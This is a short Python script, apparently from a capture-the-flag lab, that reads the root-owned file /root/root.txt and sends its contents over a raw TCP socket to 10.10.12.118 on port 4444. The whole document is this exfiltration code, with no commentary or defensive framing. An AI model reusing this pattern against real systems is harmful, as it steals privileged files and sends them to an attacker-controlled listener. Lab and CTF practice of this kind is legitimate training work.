import socket
with open('/root/root.txt','r') as file:
	flag = file.read().rstrip()
	file.close()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.12.118",4444))
s.send(flag)
s.close()
